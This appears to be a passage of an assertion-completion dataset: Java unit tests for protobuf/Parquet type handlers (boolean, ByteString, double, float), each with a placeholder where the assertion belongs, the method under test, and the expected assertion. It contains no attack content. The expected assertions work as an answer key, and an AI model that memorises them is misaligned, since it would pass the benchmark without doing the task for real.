parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { return simpleGroup.getBoolean(fieldName, 0); } else { /* return default value */ return false; } }"	assertEquals(false, actualValue)
"shouldReturnArrayOfJavaBooleanValuesForFieldOfTypeRepeatedBooleanInsideSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""boolean_array_field"");  GroupType parquetSchema = buildMessage() .repeated(BOOLEAN).named(""boolean_array_field"") .named(""TestBookingLogMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); simpleGroup.add(""boolean_array_field"", true); simpleGroup.add(""boolean_array_field"", false);  BooleanHandler booleanHandler = new BooleanHandler(fieldDescriptor); boolean[] actualValue = (boolean[]) booleanHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); boolean[] booleanArray = new boolean[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { booleanArray[i] = simpleGroup.getBoolean(fieldName, i); } return booleanArray; } return new boolean[0]; }"	assertArrayEquals(new boolean[]{true, false}, actualValue)
"shouldReturnEmptyBooleanArrayWhenParseRepeatedSimpleGroupFieldIsCalledWithNull() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""boolean_array_field"");  BooleanHandler booleanHandler = new BooleanHandler(fieldDescriptor); boolean[] actualValue = (boolean[]) booleanHandler.parseRepeatedSimpleGroupField(null);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); boolean[] booleanArray = new boolean[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { booleanArray[i] = simpleGroup.getBoolean(fieldName, i); } return booleanArray; } return new boolean[0]; }"	assertArrayEquals(new boolean[0], actualValue)
"shouldReturnEmptyBooleanArrayWhenRepeatedFieldInsideSimpleGroupIsNotPresent() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""boolean_array_field"");  GroupType parquetSchema = buildMessage() .repeated(BOOLEAN).named(""some_other_field"") .named(""TestBookingLogMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  BooleanHandler booleanHandler = new BooleanHandler(fieldDescriptor); boolean[] actualValue = (boolean[]) booleanHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); boolean[] booleanArray = new boolean[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { booleanArray[i] = simpleGroup.getBoolean(fieldName, i); } return booleanArray; } return new boolean[0]; }"	assertArrayEquals(new boolean[0], actualValue)
"shouldReturnEmptyBooleanArrayWhenRepeatedFieldInsideSimpleGroupIsNotInitialized() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""boolean_array_field"");  GroupType parquetSchema = buildMessage() .repeated(BOOLEAN).named(""boolean_array_field"") .named(""TestBookingLogMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  BooleanHandler booleanHandler = new BooleanHandler(fieldDescriptor); boolean[] actualValue = (boolean[]) booleanHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); boolean[] booleanArray = new boolean[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { booleanArray[i] = simpleGroup.getBoolean(fieldName, i); } return booleanArray; } return new boolean[0]; }"	assertArrayEquals(new boolean[0], actualValue)
"shouldHandleByteStringTypes() { Descriptors.FieldDescriptor fieldDescriptor = TestMessageEnvelope.getDescriptor().findFieldByName(""log_key""); ByteStringHandler byteStringHandler = new ByteStringHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == JavaType.BYTE_STRING; }"	assertTrue(byteStringHandler.canHandle())
"shouldNotHandleTypesOtherThanByteString() { Descriptors.FieldDescriptor fieldDescriptor = TestMessageEnvelope.getDescriptor().findFieldByName(""topic""); ByteStringHandler byteStringHandler = new ByteStringHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == JavaType.BYTE_STRING; }"	assertFalse(byteStringHandler.canHandle())
"shouldFetchValueForFieldForFieldDescriptorOfTypeByteString() { ByteString actualValue = ByteString.copyFromUtf8(""test"");  Descriptors.FieldDescriptor fieldDescriptor = TestMessageEnvelope.getDescriptor().findFieldByName(""log_key""); ByteStringHandler byteStringHandler = new ByteStringHandler(fieldDescriptor); Object value = byteStringHandler.parseObject(actualValue);  ""<AssertPlaceHolder>""; }
parseObject(Object field) { return field; }"	assertEquals(actualValue, value)
"shouldReturnTypeInformation() { Descriptors.FieldDescriptor fieldDescriptor = TestMessageEnvelope.getDescriptor().findFieldByName(""log_key""); ByteStringHandler byteStringHandler = new ByteStringHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeInformation() { return TypeInformation.of(ByteString.class); }"	assertEquals(TypeInformation.of(ByteString.class), byteStringHandler.getTypeInformation())
"shouldReturnArrayTypeInformation() { Descriptors.FieldDescriptor fieldDescriptor = TestMessageEnvelope.getDescriptor().findFieldByName(""log_key""); ByteStringHandler byteStringHandler = new ByteStringHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
getArrayType() { return Types.OBJECT_ARRAY(TypeInformation.of(ByteString.class)); }"	assertEquals(Types.OBJECT_ARRAY(TypeInformation.of(ByteString.class)), byteStringHandler.getArrayType())
"shouldReturnArrayValues() { Descriptors.FieldDescriptor fieldDescriptor = TestMessageEnvelope.getDescriptor().findFieldByName(""log_key""); ByteStringHandler byteStringHandler = new ByteStringHandler(fieldDescriptor); ArrayList<ByteString> inputValues = new ArrayList<>(Arrays.asList(ByteString.copyFromUtf8(""test1""), ByteString.copyFromUtf8(""test2""))); Object actualValues = byteStringHandler.parseRepeatedObjectField(inputValues); ""<AssertPlaceHolder>""; }
parseRepeatedObjectField(Object field) { List<ByteString> inputValues = new ArrayList<>(); if (field != null) { inputValues = (List<ByteString>) field; } return inputValues.toArray(new ByteString[]{}); }"	assertArrayEquals(inputValues.toArray(), (ByteString[]) actualValues)
"shouldReturnEmptyArrayOnNull() { Descriptors.FieldDescriptor fieldDescriptor = TestMessageEnvelope.getDescriptor().findFieldByName(""log_key""); ByteStringHandler byteStringHandler = new ByteStringHandler(fieldDescriptor); Object actualValues = byteStringHandler.parseRepeatedObjectField(null); ""<AssertPlaceHolder>""; }
parseRepeatedObjectField(Object field) { List<ByteString> inputValues = new ArrayList<>(); if (field != null) { inputValues = (List<ByteString>) field; } return inputValues.toArray(new ByteString[]{}); }"	assertEquals(0, ((ByteString[]) actualValues).length)
"shouldFetchUTF8EncodedByteStringForFieldOfTypeBinaryInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestMessageEnvelope.getDescriptor().findFieldByName(""log_key""); String testString = ""test-string""; ByteString expectedByteString = ByteString.copyFrom(testString.getBytes()); GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(BINARY).named(""log_key"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); simpleGroup.add(""log_key"", Binary.fromConstantByteArray(expectedByteString.toByteArray())); ByteStringHandler byteStringHandler = new ByteStringHandler(fieldDescriptor);  Object actualValue = byteStringHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { byte[] byteArray = simpleGroup.getBinary(fieldName, 0).getBytes(); return ByteString.copyFrom(byteArray); } else { return null; } }"	assertEquals(expectedByteString, actualValue)
"shouldReturnNullIfFieldNotPresentInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestMessageEnvelope.getDescriptor().findFieldByName(""log_key""); GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(BINARY).named(""some-other-field"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); ByteStringHandler byteStringHandler = new ByteStringHandler(fieldDescriptor);  Object actualValue = byteStringHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { byte[] byteArray = simpleGroup.getBinary(fieldName, 0).getBytes(); return ByteString.copyFrom(byteArray); } else { return null; } }"	assertNull(actualValue)
"shouldReturnNullIfFieldNotInitializedWithAValueInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestMessageEnvelope.getDescriptor().findFieldByName(""log_key""); /* The field is added to the schema but not assigned a value */ GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(BINARY).named(""log_key"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); ByteStringHandler byteStringHandler = new ByteStringHandler(fieldDescriptor);  Object actualValue = byteStringHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { byte[] byteArray = simpleGroup.getBinary(fieldName, 0).getBytes(); return ByteString.copyFrom(byteArray); } else { return null; } }"	assertNull(actualValue)
"shouldReturnArrayOfByteStringValuesForFieldOfTypeRepeatedBinaryInsideSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestRepeatedPrimitiveMessage.getDescriptor().findFieldByName(""metadata_bytes"");  String testString1 = ""useful-metadata-string""; String testString2 = ""another-metadata-string""; ByteString expectedByteString1 = ByteString.copyFrom(testString1.getBytes()); ByteString expectedByteString2 = ByteString.copyFrom(testString2.getBytes());  GroupType parquetSchema = buildMessage() .repeated(BINARY).named(""metadata_bytes"") .named(""TestRepeatedPrimitiveMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  simpleGroup.add(""metadata_bytes"", Binary.fromConstantByteArray(expectedByteString1.toByteArray())); simpleGroup.add(""metadata_bytes"", Binary.fromConstantByteArray(expectedByteString2.toByteArray()));  ByteStringHandler byteStringHandler = new ByteStringHandler(fieldDescriptor); ByteString[] actualValue = (ByteString[]) byteStringHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); ArrayList<ByteString> byteStringList = new ArrayList<>(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); for (int i = 0; i < repetitionCount; i++) { byte[] byteArray = simpleGroup.getBinary(fieldName, i).getBytes(); byteStringList.add(ByteString.copyFrom(byteArray)); } } return byteStringList.toArray(new ByteString[]{}); }"	assertArrayEquals(new ByteString[]{expectedByteString1, expectedByteString2}, actualValue)
"shouldReturnEmptyByteStringArrayWhenParseRepeatedSimpleGroupFieldIsCalledWithNull() { Descriptors.FieldDescriptor fieldDescriptor = TestRepeatedPrimitiveMessage.getDescriptor().findFieldByName(""metadata_bytes"");  ByteStringHandler byteStringHandler = new ByteStringHandler(fieldDescriptor); ByteString[] actualValue = (ByteString[]) byteStringHandler.parseRepeatedSimpleGroupField(null);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); ArrayList<ByteString> byteStringList = new ArrayList<>(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); for (int i = 0; i < repetitionCount; i++) { byte[] byteArray = simpleGroup.getBinary(fieldName, i).getBytes(); byteStringList.add(ByteString.copyFrom(byteArray)); } } return byteStringList.toArray(new ByteString[]{}); }"	assertArrayEquals(new ByteString[0], actualValue)
"shouldReturnEmptyByteStringArrayWhenRepeatedFieldInsideSimpleGroupIsNotPresent() { Descriptors.FieldDescriptor fieldDescriptor = TestRepeatedPrimitiveMessage.getDescriptor().findFieldByName(""metadata_bytes"");  GroupType parquetSchema = buildMessage() .repeated(BOOLEAN).named(""some_other_field"") .named(""TestRepeatedPrimitiveMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  ByteStringHandler byteStringHandler = new ByteStringHandler(fieldDescriptor); ByteString[] actualValue = (ByteString[]) byteStringHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); ArrayList<ByteString> byteStringList = new ArrayList<>(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); for (int i = 0; i < repetitionCount; i++) { byte[] byteArray = simpleGroup.getBinary(fieldName, i).getBytes(); byteStringList.add(ByteString.copyFrom(byteArray)); } } return byteStringList.toArray(new ByteString[]{}); }"	assertArrayEquals(new ByteString[0], actualValue)
"shouldReturnEmptyByteStringArrayWhenRepeatedFieldInsideSimpleGroupIsNotInitialized() { Descriptors.FieldDescriptor fieldDescriptor = TestRepeatedPrimitiveMessage.getDescriptor().findFieldByName(""metadata_bytes"");  GroupType parquetSchema = buildMessage() .repeated(BINARY).named(""metadata_bytes"") .named(""TestRepeatedPrimitiveMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  ByteStringHandler byteStringHandler = new ByteStringHandler(fieldDescriptor); ByteString[] actualValue = (ByteString[]) byteStringHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); ArrayList<ByteString> byteStringList = new ArrayList<>(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); for (int i = 0; i < repetitionCount; i++) { byte[] byteArray = simpleGroup.getBinary(fieldName, i).getBytes(); byteStringList.add(ByteString.copyFrom(byteArray)); } } return byteStringList.toArray(new ByteString[]{}); }"	assertArrayEquals(new ByteString[0], actualValue)
"shouldHandleDoubleTypes() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cash_amount""); DoubleHandler doubleHandler = new DoubleHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == JavaType.DOUBLE; }"	assertTrue(doubleHandler.canHandle())
"shouldNotHandleTypesOtherThanDouble() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); DoubleHandler doubleHandler = new DoubleHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == JavaType.DOUBLE; }"	assertFalse(doubleHandler.canHandle())
"shouldFetchValueForFieldForFieldDescriptorOfTypeDouble() { double actualValue = 2.0D;  Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cash_amount""); DoubleHandler doubleHandler = new DoubleHandler(fieldDescriptor); Object value = doubleHandler.parseObject(actualValue);  ""<AssertPlaceHolder>""; }
parseObject(Object field) { return Double.parseDouble(getValueOrDefault(field, ""0"")); }"	assertEquals(actualValue, value)
"shouldFetchParsedValueForFieldForFieldDescriptorOfTypeDouble() { double actualValue = 2.0D;  Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cash_amount""); DoubleHandler doubleHandler = new DoubleHandler(fieldDescriptor); Object value = doubleHandler.parseObject(String.valueOf(actualValue));  ""<AssertPlaceHolder>""; }
parseObject(Object field) { return Double.parseDouble(getValueOrDefault(field, ""0"")); }"	assertEquals(actualValue, value)
"shouldFetchDefaultValueIfValueNotPresentForFieldDescriptorOfTypeDouble() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cash_amount""); DoubleHandler doubleHandler = new DoubleHandler(fieldDescriptor); Object value = doubleHandler.parseObject(null);  ""<AssertPlaceHolder>""; }
parseObject(Object field) { return Double.parseDouble(getValueOrDefault(field, ""0"")); }"	assertEquals(0.0D, value)
"shouldReturnTypeInformation() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cash_amount""); DoubleHandler doubleHandler = new DoubleHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeInformation() { return Types.DOUBLE; }"	assertEquals(Types.DOUBLE, doubleHandler.getTypeInformation())
"shouldReturnArrayTypeInformation() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cash_amount""); DoubleHandler doubleHandler = new DoubleHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
getArrayType() { return Types.PRIMITIVE_ARRAY(Types.DOUBLE); }"	assertEquals(Types.PRIMITIVE_ARRAY(Types.DOUBLE), doubleHandler.getArrayType())
"shouldReturnArrayValues() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cash_amount""); DoubleHandler doubleHandler = new DoubleHandler(fieldDescriptor); ArrayList<Double> inputValues = new ArrayList<>(Arrays.asList(1D, 2D, 3D)); double[] actualValues = (double[]) doubleHandler.parseRepeatedObjectField(inputValues);  ""<AssertPlaceHolder>""; }
parseRepeatedObjectField(Object field) { double[] inputValues = new double[0]; if (field != null) { inputValues = Doubles.toArray((List<Double>) field); } return inputValues; }"	assertTrue(Arrays.equals(new double[]{1D, 2D, 3D}, actualValues))
"shouldReturnEmptyArrayOnNull() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cash_amount""); DoubleHandler doubleHandler = new DoubleHandler(fieldDescriptor); Object actualValues = doubleHandler.parseRepeatedObjectField(null);  ""<AssertPlaceHolder>""; }
parseRepeatedObjectField(Object field) { double[] inputValues = new double[0]; if (field != null) { inputValues = Doubles.toArray((List<Double>) field); } return inputValues; }"	assertEquals(0, ((double[]) actualValues).length)
"shouldFetchParsedValueForFieldOfTypeDoubleInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cash_amount""); GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(DOUBLE).named(""cash_amount"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); simpleGroup.add(""cash_amount"", 34.23D);  DoubleHandler doubleHandler = new DoubleHandler(fieldDescriptor); Object actualValue = doubleHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { return simpleGroup.getDouble(fieldName, 0); } else { /* return default value */ return 0.0D; } }"	assertEquals(34.23D, actualValue)
"shouldFetchDefaultValueIfFieldNotPresentInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cash_amount"");  GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(DOUBLE).named(""some-other-field"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); DoubleHandler doubleHandler = new DoubleHandler(fieldDescriptor);  Object actualValue = doubleHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { return simpleGroup.getDouble(fieldName, 0); } else { /* return default value */ return 0.0D; } }"	assertEquals(0.0D, actualValue)
"shouldFetchDefaultValueIfFieldNotInitializedWithAValueInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""cash_amount"");  /* The field is added to the schema but not assigned a value */ GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(DOUBLE).named(""cash_amount"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); DoubleHandler doubleHandler = new DoubleHandler(fieldDescriptor);  Object actualValue = doubleHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { return simpleGroup.getDouble(fieldName, 0); } else { /* return default value */ return 0.0D; } }"	assertEquals(0.0D, actualValue)
"shouldReturnArrayOfDoubleValuesForFieldOfTypeRepeatedDoubleInsideSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""double_array_field"");  GroupType parquetSchema = buildMessage() .repeated(DOUBLE).named(""double_array_field"") .named(""TestBookingLogMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  simpleGroup.add(""double_array_field"", 0.45123D); simpleGroup.add(""double_array_field"", 23.0123D);  DoubleHandler doubleHandler = new DoubleHandler(fieldDescriptor); double[] actualValue = (double[]) doubleHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); double[] doubleArray = new double[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { doubleArray[i] = simpleGroup.getDouble(fieldName, i); } return doubleArray; } return new double[0]; }"	assertArrayEquals(new double[]{0.45123D, 23.0123D}, actualValue, 0D)
"shouldReturnEmptyDoubleArrayWhenParseRepeatedSimpleGroupFieldIsCalledWithNull() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""double_array_field"");  DoubleHandler doubleHandler = new DoubleHandler(fieldDescriptor); double[] actualValue = (double[]) doubleHandler.parseRepeatedSimpleGroupField(null);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); double[] doubleArray = new double[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { doubleArray[i] = simpleGroup.getDouble(fieldName, i); } return doubleArray; } return new double[0]; }"	assertArrayEquals(new double[0], actualValue, 0D)
"shouldReturnEmptyDoubleArrayWhenRepeatedDoubleFieldInsideSimpleGroupIsNotPresent() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""double_array_field"");  GroupType parquetSchema = buildMessage() .repeated(BOOLEAN).named(""some_other_field"") .named(""TestBookingLogMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  DoubleHandler doubleHandler = new DoubleHandler(fieldDescriptor); double[] actualValue = (double[]) doubleHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); double[] doubleArray = new double[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { doubleArray[i] = simpleGroup.getDouble(fieldName, i); } return doubleArray; } return new double[0]; }"	assertArrayEquals(new double[0], actualValue, 0D)
"shouldReturnEmptyDoubleArrayWhenRepeatedDoubleFieldInsideSimpleGroupIsNotInitialized() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""double_array_field"");  GroupType parquetSchema = buildMessage() .repeated(DOUBLE).named(""double_array_field"") .named(""TestBookingLogMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  DoubleHandler doubleHandler = new DoubleHandler(fieldDescriptor); double[] actualValue = (double[]) doubleHandler.parseRepeatedSimpleGroupField(simpleGroup);  ""<AssertPlaceHolder>""; }
parseRepeatedSimpleGroupField(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { int repetitionCount = simpleGroup.getFieldRepetitionCount(fieldName); double[] doubleArray = new double[repetitionCount]; for (int i = 0; i < repetitionCount; i++) { doubleArray[i] = simpleGroup.getDouble(fieldName, i); } return doubleArray; } return new double[0]; }"	assertArrayEquals(new double[0], actualValue, 0D)
"shouldHandleFloatTypes() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""amount_paid_by_cash""); FloatHandler floatHandler = new FloatHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == JavaType.FLOAT; }"	assertTrue(floatHandler.canHandle())
"shouldNotHandleTypesOtherThanFloat() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); FloatHandler floatHandler = new FloatHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == JavaType.FLOAT; }"	assertFalse(floatHandler.canHandle())
"shouldFetchValueForFieldForFieldDescriptorOfTypeFloat() { float actualValue = 5.1f;  Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""amount_paid_by_cash""); FloatHandler floatHandler = new FloatHandler(fieldDescriptor); Object value = floatHandler.parseObject(actualValue);  ""<AssertPlaceHolder>""; }
parseObject(Object field) { return Float.parseFloat(getValueOrDefault(field, ""0"")); }"	assertEquals(actualValue, value)
"shouldFetchParsedValueForFieldForFieldDescriptorOfTypeFloat() { float actualValue = 5.1f;  Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""amount_paid_by_cash""); FloatHandler floatHandler = new FloatHandler(fieldDescriptor); Object value = floatHandler.parseObject(String.valueOf(actualValue));  ""<AssertPlaceHolder>""; }
parseObject(Object field) { return Float.parseFloat(getValueOrDefault(field, ""0"")); }"	assertEquals(actualValue, value)
"shouldFetchDefaultValueIfValueNotPresentForFieldDescriptorOfTypeFloat() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""amount_paid_by_cash""); FloatHandler floatHandler = new FloatHandler(fieldDescriptor); Object value = floatHandler.parseObject(null);  ""<AssertPlaceHolder>""; }
parseObject(Object field) { return Float.parseFloat(getValueOrDefault(field, ""0"")); }"	assertEquals(0.0f, value)
"shouldReturnTypeInformation() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""amount_paid_by_cash""); FloatHandler floatHandler = new FloatHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeInformation() { return Types.FLOAT; }"	assertEquals(Types.FLOAT, floatHandler.getTypeInformation())
"shouldReturnArrayTypeInformation() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""amount_paid_by_cash""); FloatHandler floatHandler = new FloatHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
getArrayType() { return Types.PRIMITIVE_ARRAY(Types.FLOAT); }"	assertEquals(Types.PRIMITIVE_ARRAY(Types.FLOAT), floatHandler.getArrayType())
